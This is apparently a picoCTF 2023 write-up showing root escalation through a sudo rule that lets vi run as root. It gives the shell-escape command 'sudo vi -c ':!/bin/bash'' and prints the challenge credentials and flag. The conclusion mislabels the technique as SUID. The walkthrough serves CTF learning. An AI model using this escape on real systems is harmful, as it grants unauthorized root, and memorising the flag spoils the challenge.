# Permissions

## Overview

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Author: Geoffrey Njogu

Description

Can you read files in the root file? The system admin has provisioned an account for you on the main server: `ssh -p 53645 picoplayer@saturn.picoctf.net` Password: `Sd9KYTm5kr` Can you login and read the root file?

## Find the flag

**Let's SSH into the instance!**
```shell
┌[siunam♥earth]-(~/ctf/picoCTF-2023)-[2023.03.16|15:07:21(HKT)]
└> ssh -p 53645 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:53645 ([13.59.203.175]:53645)' can't be established.
ED25519 key fingerprint is SHA256:Km7la74G7/fztU37KiXuMDlWhxowKKAxA3TjvWy1Y0o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:53645' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
picoplayer@challenge:~$ whoami;hostname;id
picoplayer
challenge
uid=1000(picoplayer) gid=1000(picoplayer) groups=1000(picoplayer)
```

Now, the challenge's description said:

> "Can you read files in the root file?"

**Armed with above information, we can list our user's sudo permisson:**
```shell
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

As you can see, **we can run `/usr/bin/vi` as root!**

**According to [GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo), we can escalate our privilege to root via:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/picoCTF-2023/images/Pasted%20image%2020230316151145.png)

**Let's do that!**
```shell
picoplayer@challenge:~$ sudo /usr/bin/vi -c ':!/bin/bash' /dev/null

root@challenge:/home/picoplayer# whoami;hostname;id
root
challenge
uid=0(root) gid=0(root) groups=0(root)
```

Boom! I'm root!

**Let's `cat` the flag!**
```shell
root@challenge:/home/picoplayer# ls -lah /root
total 16K
drwx------ 1 root root   22 Mar 16 07:12 .
drwxr-xr-x 1 root root   63 Mar 16 07:06 ..
-rw-r--r-- 1 root root 3.1K Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Mar 16 02:29 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  664 Mar 16 07:12 .viminfo
root@challenge:/home/picoplayer# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
```

- **Flag: `picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}`**

## Conclusion

What we've learned:

1. Vertical Privilege Escalation Via `vi` SUID Binary